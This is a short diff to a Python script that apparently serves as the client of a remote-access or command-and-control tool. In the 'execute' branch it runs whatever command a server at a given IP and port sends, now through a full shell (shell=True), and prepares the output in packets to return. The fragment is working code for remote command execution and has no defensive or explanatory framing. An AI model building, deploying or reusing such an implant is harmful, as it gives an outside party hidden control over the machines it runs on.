@@ -50,9 +50,12 @@ def main(ip, port):
 				f.close()
 	elif (command[0] == 'execute'):
 		print('[*] Server wants us to execute a command')
-		print('[*] Executing {}'.format(command[1]))
 
-		result = subprocess.check_output([command[1]])
+		cmd = ' '.join(command[1:])
+
+		print('[*] Executing {}'.format(cmd))
+
+		result = subprocess.check_output(cmd, shell=True)
 		
 		if (len(result) > 2042): # we have to split data into smaller packets
 			packet_count = int(math.ceil(len(result)/2042))
